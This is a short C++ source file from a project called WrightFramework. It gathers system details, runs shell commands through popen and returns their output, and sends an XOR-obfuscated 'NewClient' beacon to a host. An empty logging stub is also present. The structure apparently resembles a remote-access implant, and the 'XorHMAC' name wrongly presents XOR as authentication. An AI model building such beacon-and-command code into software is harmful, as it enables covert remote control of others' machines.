//
//  WrightCore.cpp
//  WrightFramework
//
//  Created by william wright on 2/18/19.
//  Copyright © 2019 Silvertap. All rights reserved.
//

#include "WrightCore.hpp"

utsname GetSystemInformation(){
    struct utsname sysinfo;
    uname(&sysinfo);
    return sysinfo;
}
std::string RunCommand(const char* cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}
int FirstConnect(WrightNetworking Client,WrightCryptography ClientCrypto){
    //Get Information About The Client System
    struct utsname sysinfo = GetSystemInformation();
    //Create a String With The Client Information
    std::stringstream ss;
    ss <<"NewClient["<<sysinfo.machine<<"]";
    std::string ClientInfoString = ss.str();
    //Encrypt The String To Send To Host
    ClientCrypto.XorHMAC(ClientInfoString, 'S', 'n');
    //Convert C++ String into C Char[]
    char *buffer = &ClientInfoString[0u];
    //Connect and send the Info to the Host
    Client.ConnectSocket();
    Client.SendData(buffer);
    return 1;
}
void StartLogging(){
    
}
